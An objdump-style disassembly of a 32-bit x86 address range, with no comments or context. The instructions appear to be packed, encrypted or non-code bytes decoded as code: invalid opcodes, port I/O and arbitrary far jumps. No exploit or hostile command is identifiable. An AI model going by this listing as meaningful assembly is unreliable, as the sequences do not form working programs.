  41ba0d:	das    
  41ba0e:	dec    esi
  41ba0f:	mov    ds:0xe7bbde3,eax
  41ba14:	inc    ebp
  41ba15:	stos   BYTE PTR es:[edi],al
  41ba16:	imul   esp,DWORD PTR [esi-0x6fd85854],0xffffffb4
  41ba1d:	push   ss
  41ba1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba1f:	mov    cl,0x97
  41ba21:	push   ebp
  41ba22:	aaa    
  41ba23:	lds    ecx,FWORD PTR [edx-0xc7c3577]
  41ba29:	out    dx,eax
  41ba2a:	aas    
  41ba2b:	cmc    
  41ba2c:	add    DWORD PTR [bp+si],0xbc5b565
  41ba33:	adc    bh,BYTE PTR [ebp-0xeccce1f]
  41ba39:	out    dx,al
  41ba3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba3b:	pop    ebx
  41ba3c:	sub    eax,0x4e2c10b1
  41ba41:	xor    ecx,DWORD PTR [ecx]
  41ba43:	inc    esp
  41ba44:	xchg   ecx,eax
  41ba45:	pop    ecx
  41ba46:	push   cs
  41ba47:	inc    ecx
  41ba48:	add    dh,ch
  41ba4a:	sbb    dh,BYTE PTR [edi]
  41ba4c:	push   eax
  41ba4d:	retf   0x698d
  41ba50:	inc    edx
  41ba51:	repnz sub ah,dl
  41ba54:	loop   0x41baab
  41ba56:	and    esp,DWORD PTR [edi-0x1dfa2a92]
  41ba5c:	retf   0x335c
  41ba5f:	mov    WORD PTR [esp+eiz*4-0x51ca0572],cs
  41ba66:	xchg   edi,ecx
  41ba68:	rol    ebp,cl
  41ba6a:	add    BYTE PTR [ebp-0x78],bh
  41ba6d:	in     eax,0xaa
  41ba6f:	pop    esp
  41ba70:	rcl    BYTE PTR [edi],0x37
  41ba73:	aad    0x2b
  41ba75:	dec    esp
  41ba76:	xchg   edi,eax
  41ba77:	dec    ebp
  41ba78:	ret    
  41ba79:	gs jne 0x41ba43
  41ba7c:	adc    BYTE PTR ds:0x9c9e2dd1,cl
  41ba82:	mov    bh,0xde
  41ba84:	push   ebx
  41ba85:	and    BYTE PTR [edx],al
  41ba87:	in     al,dx
  41ba88:	cmc    
  41ba89:	cdq    
  41ba8a:	add    al,0x3d
  41ba8c:	icebp  
  41ba8d:	sti    
  41ba8e:	mov    WORD PTR [edx],?
  41ba90:	mul    BYTE PTR [ecx]
  41ba92:	mov    eax,0x422c51ef
  41ba97:	xor    al,0x36
  41ba99:	enter  0x834d,0xf4
  41ba9d:	xchg   DWORD PTR [ebp-0x6dd7d511],eax
  41baa3:	sti    
  41baa4:	and    dl,al
  41baa6:	dec    eax
  41baa7:	dec    eax
  41baa8:	daa    
  41baa9:	shl    DWORD PTR [esi-0x7],0x6e
  41baad:	ffreep st(3)
  41baaf:	jae    0x41baf2
  41bab1:	pusha  
  41bab2:	adc    eax,DWORD PTR [ecx+0x2d5ecbfd]
  41bab8:	fmul   QWORD PTR [edi]
  41baba:	fwait
  41babb:	cmp    eax,0xd2b011ed
  41bac0:	xchg   edx,eax
  41bac1:	mov    edi,edi
  41bac3:	push   esi
  41bac4:	gs jecxz 0x41badb
  41bac7:	inc    edi
  41bac8:	push   es
  41bac9:	mov    esi,DWORD PTR [edx-0x42]
  41bacc:	jp     0x41bb38
  41bace:	sbb    ebp,ebp
  41bad0:	daa    
  41bad1:	call   0xb5cb:0x154ff31f
  41bad8:	cwde   
  41bad9:	push   ss
  41bada:	mov    eax,0xf7b5bb00
  41badf:	pushf  
  41bae0:	retf   
  41bae1:	jge    0x41ba9e
  41bae3:	std    
  41bae4:	push   0x7f1f4435
  41bae9:	pusha  
  41baea:	push   eax
  41baeb:	int    0x2d
  41baed:	or     eax,0x3f891cf0
  41baf2:	add    ch,BYTE PTR [ebx]
  41baf4:	adc    DWORD PTR [ebx-0x3df89086],ebp
  41bafa:	(bad)  
  41bafb:	(bad)  
  41bafc:	out    dx,al
  41bafd:	clc    
  41bafe:	stos   DWORD PTR es:[edi],eax
  41baff:	in     al,dx
  41bb00:	iret   
  41bb01:	repz push ss
  41bb03:	pop    ecx
  41bb04:	mov    ds:0x8f32db06,eax
  41bb09:	std    
  41bb0a:	ds jnp 0x41bab4
  41bb0d:	ss inc ebp
  41bb0f:	sub    al,0x4a
  41bb11:	sub    BYTE PTR [eax],bl
  41bb13:	loope  0x41bb51
  41bb15:	nop
  41bb16:	pop    edx
  41bb17:	neg    bh
  41bb19:	dec    esi
  41bb1a:	inc    edi
  41bb1b:	fist   WORD PTR [ebx+0x79]
  41bb1e:	mov    ah,0xc6
  41bb20:	int3   
  41bb21:	sub    dl,bl
  41bb23:	mov    ds:0x6f2dbacb,al
  41bb28:	xchg   ebx,eax
  41bb29:	div    BYTE PTR [edi]
  41bb2b:	sub    eax,0x8e234a16
  41bb30:	lock leave 
  41bb32:	mov    ebp,DWORD PTR [edi]
  41bb34:	test   eax,0xb66732e2
  41bb39:	arpl   WORD PTR [ebx],si
  41bb3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb3c:	mov    ds:0x6842f31d,eax
  41bb41:	adc    dl,dl
  41bb43:	or     ch,ch
  41bb45:	(bad)  
  41bb46:	stos   DWORD PTR es:[edi],eax
  41bb47:	(bad)  
  41bb48:	push   cs
  41bb49:	aas    
  41bb4a:	stos   DWORD PTR es:[edi],eax
  41bb4b:	xor    ecx,ebx
  41bb4d:	ds lahf 
  41bb4f:	jno    0x41bad9
  41bb51:	ds sbb al,dh
  41bb54:	int3   
  41bb55:	pop    ds
  41bb56:	push   ss
  41bb57:	(bad)  
  41bb58:	in     al,dx
  41bb59:	aad    0xea
  41bb5b:	sahf   
  41bb5c:	dec    ebp
  41bb5d:	popa   
  41bb5e:	mov    dh,0xf4
  41bb60:	inc    ecx
  41bb61:	xchg   esi,eax
  41bb62:	ror    BYTE PTR [edi],cl
  41bb64:	clc    
  41bb65:	add    dl,BYTE PTR [esi*4+0x7266277b]
  41bb6c:	sub    BYTE PTR ds:0xde528d82,ah
  41bb72:	sub    BYTE PTR [ecx+esi*1],ch
  41bb75:	sbb    cl,bh
  41bb77:	(bad)  
  41bb78:	cmp    ebx,ebx
  41bb7a:	out    dx,eax
  41bb7b:	xchg   edx,eax
  41bb7c:	sbb    eax,0x5e51f3a3
  41bb81:	push   ecx
  41bb82:	jb     0x41bb8a
  41bb84:	jmp    0xe0c7:0x345a20ad
  41bb8b:	pop    ecx
  41bb8c:	aam    0x3f
  41bb8e:	add    bh,BYTE PTR [eax+ebp*1-0x17]
  41bb92:	pop    esi
  41bb93:	inc    esi
  41bb94:	scas   al,BYTE PTR es:[edi]
  41bb95:	mov    ah,BYTE PTR ds:0x26edcdfe
  41bb9b:	icebp  
  41bb9c:	ja     0x41bc0f
  41bb9e:	lahf   
  41bb9f:	int    0x3c
  41bba1:	xchg   BYTE PTR [ebp-0x41],bh
  41bba4:	sbb    DWORD PTR [eax-0x3e],ecx
  41bba7:	jge    0x41bc1a
  41bba9:	mov    ebx,0xcb470222
  41bbae:	add    eax,0xcdb63f48
  41bbb3:	mov    al,0x9c
  41bbb5:	(bad)  
  41bbb6:	cmc    
  41bbb7:	mov    ah,ch
  41bbb9:	outs   dx,DWORD PTR ds:[esi]
  41bbba:	mov    ecx,0xc70d675f
  41bbbf:	je     0x41bc0c
  41bbc1:	outs   dx,BYTE PTR ds:[esi]
  41bbc2:	stos   BYTE PTR es:[edi],al
  41bbc3:	out    0x1e,eax
  41bbc5:	or     edx,edx
  41bbc7:	not    BYTE PTR [edi]
  41bbc9:	sub    DWORD PTR [ebx-0x1e437b78],edx
  41bbcf:	xchg   DWORD PTR [ebp-0x3ec377c4],edi
  41bbd5:	fld    DWORD PTR [ebx]
  41bbd7:	int3   
  41bbd8:	ror    BYTE PTR [ecx+0x40],cl
  41bbdb:	xchg   BYTE PTR [esi-0x75],bh
  41bbde:	into   
  41bbdf:	icebp  
  41bbe0:	popf   
  41bbe1:	mov    eax,DWORD PTR [ecx]
  41bbe3:	cmp    edx,DWORD PTR [ebx]
  41bbe5:	pop    eax
  41bbe6:	shl    DWORD PTR [edx],0x38
  41bbe9:	add    dh,BYTE PTR [ebp-0x2e]
  41bbec:	add    BYTE PTR [eax+ebx*1+0xf],cl
  41bbf0:	cmp    al,0x24
  41bbf2:	inc    ebp
  41bbf3:	mov    es,WORD PTR [edx-0x57f53e89]
  41bbf9:	rcr    DWORD PTR [edx+0x2b],0xb0
  41bbfd:	and    eax,0x99654a9f
  41bc02:	into   
  41bc03:	ins    BYTE PTR es:[edi],dx
  41bc04:	pop    edx
  41bc05:	mov    ebx,0x530a970b
  41bc0a:	ins    DWORD PTR es:[edi],dx
  41bc0b:	mov    bh,0x49
  41bc0d:	xor    al,0xf
  41bc0f:	sub    DWORD PTR [ebx+0x782f4c5e],0x35
  41bc16:	mov    ch,0xf
  41bc18:	aam    0xc0
  41bc1a:	sub    dh,bl
  41bc1c:	mov    ds:0xbfad0944,al
  41bc21:	fs pop ss
  41bc23:	mul    DWORD PTR [ecx+eiz*8+0x3e]
  41bc27:	ret    
  41bc28:	pop    ss
  41bc29:	lods   al,BYTE PTR ds:[esi]
  41bc2a:	in     eax,0x49
  41bc2c:	pop    ecx
  41bc2d:	pop    esp
  41bc2e:	(bad)  
  41bc2f:	dec    edi
  41bc30:	inc    ebx
  41bc31:	push   0x1d
  41bc33:	je     0x41bc95
  41bc35:	mov    ?,WORD PTR [edx]
  41bc37:	pop    esi
  41bc38:	sub    DWORD PTR [ebp+eax*2+0x691795d],ebx
  41bc3f:	xchg   esp,eax
  41bc40:	(bad)
  41bc43:	aas    
  41bc44:	stos   DWORD PTR es:[edi],eax
  41bc45:	jno    0x41bc6d
  41bc47:	stc    
  41bc48:	xor    ecx,DWORD PTR [ebx+ebx*4+0x76]
  41bc4c:	mov    esi,0xaaf61d9
  41bc51:	ret    0x2881
  41bc54:	(bad)  
  41bc55:	jmp    0x8913:0x647c5ca7
  41bc5c:	adc    ah,dl
  41bc5e:	xchg   edx,eax
  41bc5f:	push   ss
  41bc60:	test   eax,0x9c39bd9a
  41bc65:	cmp    DWORD PTR [ecx],esp
  41bc67:	js     0x41bcbf
  41bc69:	mov    bl,0x2f
  41bc6b:	mov    ch,BYTE PTR [bx+si]
  41bc6e:	(bad)  
  41bc6f:	shl    DWORD PTR [esi+ebx*1-0x65237669],cl
  41bc76:	fst    DWORD PTR [edx]
  41bc78:	jmp    0x3434:0x5634d042
  41bc7f:	sbb    eax,DWORD PTR [edx]
  41bc81:	add    bh,BYTE PTR [edx-0x46]
  41bc84:	cld    
  41bc85:	cli    
  41bc86:	push   ecx
  41bc87:	xchg   BYTE PTR [edi-0x1ce75488],bl
  41bc8d:	jge    0x2fb20854
  41bc93:	jle    0x41bceb
  41bc95:	stos   DWORD PTR es:[edi],eax
  41bc96:	stos   BYTE PTR es:[edi],al
  41bc97:	or     dl,BYTE PTR [ebx-0xd2471eb]
  41bc9d:	jmp    0x41bc7d
  41bc9f:	cmp    BYTE PTR [edx],dl
  41bca1:	jae    0x41bcfe
  41bca3:	sub    al,0x5d
  41bca5:	mov    edx,0xded00eb4
  41bcaa:	je     0xa5e41ea0
  41bcb0:	sbb    ah,BYTE PTR [ebx]
  41bcb2:	sar    DWORD PTR [edi],0x83
  41bcb5:	fistp  WORD PTR [ecx]
  41bcb7:	adc    esi,eax
  41bcb9:	push   eax
  41bcba:	cmp    BYTE PTR [ebx+0x5432d983],0x39
  41bcc1:	and    al,0x64
  41bcc3:	and    ah,bl
  41bcc5:	sub    al,BYTE PTR [edi+0x3e1e3ddc]
  41bccb:	imul   eax,DWORD PTR [edx+0x51a18bb6],0xa4f2a820
  41bcd5:	hlt    
  41bcd6:	or     al,0x2
  41bcd8:	dec    eax
  41bcd9:	sub    ah,BYTE PTR [edx+0x2555047b]
  41bcdf:	outs   dx,BYTE PTR ds:[esi]
  41bce0:	in     al,0xd
  41bce2:	or     al,0xd1
  41bce4:	test   DWORD PTR [edi-0x60],0x6a999b9d
  41bceb:	jbe    0x41bd37
  41bced:	jnp    0x41bd12
  41bcef:	mov    ebp,0x406a4c4d
  41bcf4:	mov    cl,BYTE PTR [esi+0x7708b49e]
  41bcfa:	jle    0x41bce7
  41bcfc:	fstp   TBYTE PTR [ebx+eax*8+0x3beeb678]
  41bd03:	mov    esi,0xf7bb2ed9
  41bd08:	xlat   BYTE PTR ds:[ebx]
  41bd09:	and    BYTE PTR ds:0xfb33f46d,ah
  41bd0f:	push   ds
  41bd10:	rcr    BYTE PTR [edi-0x5c],cl
  41bd13:	rol    DWORD PTR [edx+0x1d5197c3],cl
  41bd19:	popf   
  41bd1a:	ins    DWORD PTR es:[edi],dx
  41bd1b:	loope  0x41bcb2
  41bd1d:	push   es
  41bd1e:	test   eax,0xd4cb4574
  41bd23:	jecxz  0x41bcbe
  41bd25:	mov    bh,BYTE PTR [edx-0x12ce6aa0]
  41bd2b:	mov    dh,0x63
  41bd2d:	loopne 0x41bdac
  41bd2f:	inc    esp
  41bd30:	lods   eax,DWORD PTR ds:[esi]
  41bd31:	jmp    0xecc8:0xe826dbdf
  41bd38:	mov    ch,0x97
  41bd3a:	mul    BYTE PTR [eax-0x6572c961]
  41bd40:	push   0x60
  41bd42:	gs in  al,dx
  41bd44:	mov    al,0xa3
  41bd46:	mov    esi,0x59cb2a01
  41bd4b:	inc    ebx
  41bd4c:	or     ebx,DWORD PTR [edx+0x269a2b68]
  41bd52:	in     al,dx
  41bd53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd54:	mov    ds:0x2ba79a9b,al
  41bd59:	adc    ebp,DWORD PTR [ecx+0x35]
  41bd5c:	js     0x41bcde
  41bd5e:	mov    edi,DWORD PTR [esi+eiz*1]
  41bd61:	jg     0x41bd8a
  41bd63:	xor    al,BYTE PTR [ebx]
  41bd65:	ja     0x41bd6c
  41bd67:	stc    
  41bd68:	dec    ebx
  41bd69:	aaa    
  41bd6a:	stc    
  41bd6b:	in     al,dx
  41bd6c:	das    
  41bd6d:	xor    ebp,DWORD PTR [ebx+0x4847fa27]
  41bd73:	adc    BYTE PTR [edi+ecx*2+0x29c3d49e],bh
  41bd7a:	pop    es
  41bd7b:	test   BYTE PTR [edi+0x44ee47a2],dl
  41bd81:	dec    esi
  41bd82:	push   ebp
  41bd83:	push   ecx
  41bd84:	or     ch,BYTE PTR [ebx+0x359e68bc]
  41bd8a:	jle    0x41bdb1
  41bd8c:	pop    DWORD PTR [ebp+0x47]
  41bd8f:	dec    edi
  41bd90:	ja     0x41bda3
  41bd92:	adc    al,0x31
  41bd94:	(bad)  
  41bd95:	xor    eax,0x840e880c
  41bd9a:	arpl   WORD PTR [ebx+0x59],sp
  41bd9d:	inc    edx
  41bd9e:	mov    ch,0xab
  41bda0:	into   
  41bda1:	mov    dh,0xd8
  41bda3:	sub    BYTE PTR [esi+0x59ecfaf9],dh
  41bda9:	and    eax,0xb4a8009f
  41bdae:	jge    0x41bdb4
  41bdb0:	stos   BYTE PTR es:[edi],al
  41bdb1:	or     DWORD PTR [ecx-0x4a],edi
  41bdb4:	and    edx,ebp
  41bdb6:	mov    edi,0x404e3f3b
  41bdbb:	fbstp  TBYTE PTR [eax]
  41bdbd:	jmp    0x6397cb23
  41bdc2:	cli    
  41bdc3:	push   edx
  41bdc4:	stc    
  41bdc5:	add    ebp,DWORD PTR [ebx+edx*8+0x3f20369a]
  41bdcc:	imul   ebp,DWORD PTR [edi-0x59],0xffffffa2
  41bdd0:	push   esp
  41bdd1:	or     eax,DWORD PTR [eax]
	...
  41bfa7:	add    BYTE PTR [eax],al
  41bfa9:	add    BYTE PTR [ebx+ecx*8],dl
  41bfac:	mov    bl,0x9a
  41bfae:	(bad)  
  41bfaf:	cli    
  41bfb0:	cmp    eax,0x190968cf
  41bfb5:	mov    esp,esp
  41bfb7:	ja     0x41c019
  41bfb9:	enter  0xa15f,0x1
  41bfbd:	add    BYTE PTR [esi],bl
  41bfbf:	pop    es
  41bfc0:	add    BYTE PTR [eax],al
  41bfc2:	scas   eax,DWORD PTR es:[edi]
  41bfc3:	mov    ebp,0xe32afbe8
  41bfc8:	ja     0x41bfc9
  41bfca:	or     eax,0x22eac3f9
  41bfcf:	out    dx,eax
  41bfd0:	sub    eax,0xa8755b3f
  41bfd5:	cmp    dh,BYTE PTR [edi-0x48]
  41bfd8:	pop    ss
  41bfd9:	scas   eax,DWORD PTR es:[edi]
  41bfda:	(bad)  
  41bfdb:	outs   dx,BYTE PTR ds:[esi]
  41bfdc:	mov    bh,0xce
  41bfde:	pop    ebx
  41bfdf:	jg     0x41bfb2
  41bfe1:	outs   dx,DWORD PTR ds:[esi]
  41bfe2:	dec    ebx
  41bfe3:	fistp  QWORD PTR [edx-0x64]
  41bfe6:	xchg   ebp,eax
  41bfe7:	add    DWORD PTR [ecx+0x5b735698],esi
  41bfed:	xor    eax,0xc0d19008
  41bff2:	mov    al,ds:0xf1fb192b
  41bff7:	(bad)  
  41bff8:	outs   dx,BYTE PTR ds:[esi]
  41bff9:	ficom  WORD PTR [edi+0x7e08ae93]
  41bfff:	dec    edi
  41c000:	scas   al,BYTE PTR es:[edi]
  41c001:	inc    ebp
  41c002:	xor    dh,bl
  41c004:	xchg   ecx,eax
  41c005:	cmp    ebx,DWORD PTR [edx]
  41c007:	cld    
  41c008:	cli    
  41c009:	or     dl,0xf6
  41c00c:	add    cl,BYTE PTR [ebx+0x2a31b6d8]
  41c012:	loop   0x41c04a
  41c014:	add    dh,ch
  41c016:	inc    esp
  41c017:	daa    
  41c018:	shl    BYTE PTR [eax],0xa8
  41c01b:	push   ebp
  41c01c:	jnp    0x41c005
  41c01e:	call   DWORD PTR [eax]
  41c020:	cmp    eax,0x7651963d
  41c025:	mov    cl,0x99
  41c027:	jbe    0x41c09f
  41c029:	or     eax,0x887c24a5
  41c02e:	jge    0x41c02a
  41c030:	pusha  
  41c031:	cmp    DWORD PTR [esi+edi*8],edi
  41c034:	lea    eax,[eax]
  41c036:	mov    dl,BYTE PTR [edi+0xb]
  41c039:	call   0xd684:0x163655c6
  41c040:	mov    bh,0x31
  41c042:	jmp    0x11fe:0x3d1c68b3
  41c049:	ins    DWORD PTR es:[edi],dx
  41c04a:	into   
  41c04b:	mov    bl,0xc2
  41c04d:	pop    es
  41c04e:	pop    ebp
  41c04f:	arpl   WORD PTR [eax],bp
  41c051:	mov    WORD PTR [edx-0x6ce247c4],es
  41c057:	stos   DWORD PTR es:[edi],eax
  41c058:	lock sub al,0x31
  41c05b:	loope  0x41bffd
  41c05d:	std    
  41c05e:	and    DWORD PTR [esi+0x772260b],0x62
  41c065:	mov    eax,ds:0xe9586e29
  41c06a:	xor    esi,DWORD PTR [esi+0x4]
  41c06d:	in     al,0xf8
  41c06f:	jae    0x41c0c2
  41c071:	xor    BYTE PTR [ebp+0x78],bl
  41c074:	mov    ch,0xe0
  41c076:	xlat   BYTE PTR ds:[ebx]
  41c077:	(bad)  
  41c078:	es adc eax,0xcdfe25be
  41c07e:	cmp    edi,ebp
  41c080:	pop    eax
  41c081:	pop    esp
  41c082:	aas    
  41c083:	adc    cl,dh
  41c085:	cmp    eax,0x234c9da
  41c08a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c08b:	pushf  
  41c08c:	sub    BYTE PTR [ebx-0x258ede4],0x78
  41c093:	mov    ebp,0xc3b43bf4
  41c098:	xor    al,0xc9
  41c09a:	aaa    
  41c09b:	cmp    eax,0x9d03b479
  41c0a0:	and    dh,BYTE PTR [ebx+ecx*8]
  41c0a3:	push   ds
  41c0a4:	inc    ebx
  41c0a5:	lock jmp 0x41c11c
  41c0a8:	jnp    0x41c124
  41c0aa:	mov    al,0x55
  41c0ac:	aas    
  41c0ad:	in     al,0xc9
  41c0af:	mov    eax,ds:0x29c60471
  41c0b4:	xchg   ebx,eax
  41c0b5:	sub    DWORD PTR [edx],edi
  41c0b7:	cmp    bh,dh
  41c0b9:	scas   eax,DWORD PTR es:[edi]
  41c0ba:	stos   DWORD PTR es:[edi],eax
  41c0bb:	int3   
  41c0bc:	mov    esp,0x776d81ff
  41c0c1:	enter  0x140a,0xd9
  41c0c5:	test   al,cl
  41c0c7:	out    0x94,al
  41c0c9:	jl     0x41c12a
  41c0cb:	pop    edi
  41c0cc:	ins    DWORD PTR es:[edi],dx
  41c0cd:	lods   eax,DWORD PTR ds:[esi]
  41c0ce:	jo     0x41c0b5
  41c0d0:	adc    BYTE PTR [edi-0x30],ah
  41c0d3:	(bad)  
  41c0d4:	and    BYTE PTR [ebp+esi*4+0x52],0x4d
  41c0d9:	mov    al,ds:0x95ca8398
  41c0de:	jno    0x41c136
  41c0e0:	sahf   
  41c0e1:	push   ecx
  41c0e2:	jl     0x41c116
  41c0e4:	mov    bh,BYTE PTR [ebx*4+0x3675b07]
  41c0eb:	sub    eax,0x818d9915
  41c0f0:	call   0x3189277
  41c0f5:	shl    DWORD PTR [ecx-0x2d],cl
  41c0f8:	sbb    cl,BYTE PTR [edi+0x22e32736]
  41c0fe:	test   DWORD PTR [eax],esp
  41c100:	test   edx,ebp
  41c102:	(bad)  
  41c103:	(bad)  
  41c105:	push   ebx
  41c106:	repz aaa 
  41c108:	push   esi
  41c109:	add    DWORD PTR [eax+0x7346659c],edi
  41c10f:	sub    al,0xb2
  41c111:	shr    DWORD PTR [ebx],1
  41c113:	jns    0x41c184
  41c115:	push   ebx
  41c116:	xchg   esi,eax
  41c117:	mov    bl,0x3c
  41c119:	int3   
  41c11a:	out    dx,eax
  41c11b:	xchg   ebx,eax
  41c11c:	popf   
  41c11d:	cmp    eax,edi
  41c11f:	bnd call 0x3db10ffb
  41c125:	aas    
  41c126:	dec    esi
  41c127:	in     al,0x36
  41c129:	dec    edx
  41c12a:	sub    BYTE PTR [esi+0x3a4fc21b],cl
  41c130:	xlat   BYTE PTR ds:[ebx]
  41c131:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c132:	xchg   ebx,eax
  41c133:	jge    0x41c1b0
  41c135:	ja     0x41c16b
  41c137:	fmul   DWORD PTR [edi-0x194c179c]
  41c13d:	adc    DWORD PTR [ebx-0x55],ebx
  41c140:	(bad)  
  41c141:	shl    BYTE PTR [ebp-0x373387a8],0x9a
  41c148:	sbb    bh,bl
  41c14a:	xor    BYTE PTR [edi-0x42d0b005],al
  41c150:	push   edx
  41c151:	out    0xde,al
  41c153:	inc    esi
  41c154:	lock push eax
  41c156:	rcl    bl,cl
  41c158:	clc    
  41c159:	pop    eax
  41c15a:	pop    eax
  41c15b:	aas    
  41c15c:	sbb    DWORD PTR [ecx],ecx
  41c15e:	dec    eax
  41c15f:	mov    bl,0x80
  41c161:	stos   DWORD PTR es:[edi],eax
  41c162:	inc    edx
  41c163:	sbb    ch,BYTE PTR [ebx+0x5d]
  41c166:	mov    ds:0xe0a5f38a,eax
  41c16b:	inc    esp
  41c16c:	dec    esi
  41c16d:	in     al,0x1
  41c16f:	test   eax,0xc5db6bf7
  41c174:	jns    0x41c1d1
  41c176:	nop
  41c177:	sti    
  41c178:	adc    eax,0x978bb0a0
  41c17d:	cmp    eax,0x3f053081
  41c182:	fisub  WORD PTR [edi-0x295757eb]
  41c188:	pop    es
  41c189:	sti    
  41c18a:	mov    dl,0x2c
  41c18c:	add    BYTE PTR [eax],0x45
  41c18f:	cmp    DWORD PTR [ebx-0x19],ebp
  41c192:	imul   esp,ebx,0x1a
  41c195:	lea    edi,[si-0x34b9]
  41c19a:	push   ecx
  41c19b:	int3   
  41c19c:	outs   dx,BYTE PTR ds:[esi]
  41c19d:	xchg   ebx,eax
  41c19e:	into   
  41c19f:	cmc    
  41c1a0:	and    edi,eax
  41c1a2:	ficom  DWORD PTR [ebp+0x3]
  41c1a5:	outs   dx,BYTE PTR ds:[esi]
  41c1a6:	add    BYTE PTR [eax],dh
  41c1a8:	out    0x21,eax
  41c1aa:	mov    dl,0x6b
  41c1ac:	fstp   DWORD PTR ds:0x6947a27c
  41c1b2:	sbb    al,0x56
  41c1b4:	popf   
  41c1b5:	mov    al,ds:0x8943a73a
  41c1ba:	rol    BYTE PTR [ebp+0x46],cl
  41c1bd:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1bf:	aas    
  41c1c0:	jle    0x41c23e
  41c1c2:	inc    edi
  41c1c3:	call   0xa081:0x3fbb6ee7
  41c1ca:	shld   DWORD PTR [edi+0x7a86080d],edx,0x96
  41c1d2:	dec    ecx
  41c1d3:	mov    esp,ecx
  41c1d5:	sbb    edi,ebx
  41c1d7:	fst    QWORD PTR [edx+0x32]
  41c1da:	std    
  41c1db:	mov    esp,0x8921c88a
  41c1e1:	or     al,0xfe
  41c1e3:	jbe    0x41c194
  41c1e5:	(bad)  
  41c1e6:	aas    
  41c1e7:	xor    esp,DWORD PTR [ecx-0x638fd52c]
  41c1ed:	or     al,0x8a
  41c1ef:	or     eax,0x812ab880
  41c1f4:	ficomp DWORD PTR [ecx+ebp*4-0x74e8b01a]
  41c1fb:	mov    ebx,0x467a6b53
  41c200:	stc    
  41c201:	daa    
  41c202:	push   ecx
  41c203:	pop    edx
  41c204:	out    dx,eax
  41c205:	repz sbb BYTE PTR [edx],0x5b
  41c209:	sbb    cl,BYTE PTR [edx+0x68]
  41c20c:	(bad)  
  41c20e:	sti    
  41c20f:	ret    
  41c210:	out    0xab,al
  41c212:	icebp  
  41c213:	jno    0x41c1c2
  41c215:	xor    BYTE PTR [ecx],al
  41c217:	push   0xffffff9f
  41c219:	xchg   ebp,eax
  41c21a:	or     al,0x8b
  41c21c:	(bad)  
  41c21d:	mov    ah,0xd9
  41c21f:	loop   0x41c231
  41c221:	pop    ss
  41c222:	sbb    BYTE PTR [eax-0x18d47bfa],al
  41c228:	and    al,0x63
  41c22a:	push   es
  41c22b:	jmp    0xa92c582a
  41c230:	into   
  41c231:	fidiv  DWORD PTR [ecx-0x40]
  41c234:	sub    BYTE PTR [edi],al
  41c236:	out    0x9f,eax
  41c238:	inc    edi
  41c239:	sahf   
  41c23a:	pushf  
  41c23b:	call   0x78c93af9
  41c240:	mov    bh,0x7d
  41c242:	(bad)  
  41c244:	cwde   
  41c245:	loop   0x41c274
  41c247:	pop    ebp
  41c248:	in     eax,dx
  41c249:	lock adc bh,bl
  41c24c:	ins    DWORD PTR es:[edi],dx
  41c24d:	jmp    0xc3b0:0xe55a6ea5
  41c254:	(bad)  
  41c255:	mov    dl,0x34
  41c257:	xchg   BYTE PTR [eax+0x3b],dl
  41c25a:	xor    DWORD PTR es:[edx+0x4a],0x733837ff
  41c262:	push   eax
  41c263:	add    bh,BYTE PTR [eax]
  41c265:	lds    edi,FWORD PTR [ecx+0x4]
  41c268:	pop    ecx
  41c269:	mov    edi,0x86416f84
  41c26e:	cmp    al,0x46
  41c270:	pop    esi
  41c271:	sub    dl,0x94
  41c274:	dec    edi
  41c275:	inc    edi
  41c276:	or     esp,DWORD PTR [ebp-0x1d]
  41c279:	enter  0x6140,0x7d
  41c27d:	mov    esp,0x198f972d
  41c282:	and    eax,0x7e3f48b9
  41c287:	push   ds
  41c288:	dec    esp
  41c289:	pushf  
  41c28a:	and    al,0x47
  41c28c:	mov    edx,0x17e6bdd3
  41c291:	inc    edi
  41c292:	cmp    cl,dl
  41c294:	iret   
  41c295:	mov    ecx,DWORD PTR [ecx+0x1a6b6035]
  41c29b:	mov    edi,0x2a30b6bb
  41c2a0:	or     dl,BYTE PTR [ecx-0x4f]
  41c2a3:	and    cl,BYTE PTR [ecx+0x30]
  41c2a6:	mov    ebp,0xb96c09a1
  41c2ab:	jnp    0x41c260
  41c2ad:	lahf   
  41c2ae:	enter  0x369a,0x28
  41c2b2:	or     BYTE PTR [ebx+0x760cd6f1],bh
  41c2b8:	rcl    BYTE PTR [eax-0x59],cl
  41c2bb:	outs   dx,BYTE PTR ds:[esi]
  41c2bc:	push   es
  41c2bd:	mov    esp,0x36c2c300
  41c2c2:	cdq    
  41c2c3:	mov    DWORD PTR [edx-0x726cffe4],ecx
  41c2c9:	sbb    al,0x9b
  41c2cb:	hlt    
  41c2cc:	pop    edi
  41c2cd:	sti    
  41c2ce:	push   ebp
  41c2cf:	pop    es
  41c2d0:	adc    DWORD PTR [edi+0x70],ecx
  41c2d3:	inc    esp
  41c2d4:	cmp    cl,cl
  41c2d6:	int    0x8d
  41c2d8:	adc    eax,0xafa13d7f
  41c2dd:	(bad)  
  41c2de:	js     0x41c2c9
  41c2e0:	inc    eax
  41c2e1:	lea    ebp,[edx]
  41c2e3:	jnp    0x41c293
  41c2e5:	adc    al,0x32
  41c2e7:	in     eax,0x7d
  41c2e9:	sbb    esp,0xd5880a95
  41c2ef:	xchg   BYTE PTR [ebp-0x6ce1d548],dh
  41c2f5:	icebp  
  41c2f6:	jmp    0x186f:0x83258c19
  41c2fd:	hlt    
  41c2fe:	cwde   
  41c2ff:	mov    ebx,0x747d12d6
  41c304:	dec    esi
  41c305:	addr16 xchg esp,eax
  41c307:	sti    
  41c308:	jp     0x41c338
  41c30a:	mov    dh,0xda
  41c30c:	mov    esi,0x564c371f
  41c311:	xor    al,BYTE PTR [edx+0x55]
  41c314:	jnp    0x41c2fa
  41c316:	or     esi,DWORD PTR [ecx-0x16087bdd]
  41c31c:	mov    BYTE PTR [ebx+0x4f],al
  41c31f:	add    ah,BYTE PTR [eax-0x584910ff]
  41c325:	into   
  41c326:	xor    eax,0xe9e277d9
  41c32b:	pop    es
  41c32c:	dec    esi
  41c32d:	mov    esi,0xd9bda666
  41c332:	or     BYTE PTR [esi+0x26],al
  41c335:	sub    BYTE PTR [ecx-0x4b60b134],0x76
  41c33c:	cmp    ch,dh
  41c33e:	ds jb  0x41c31b
  41c341:	js     0x41c35b
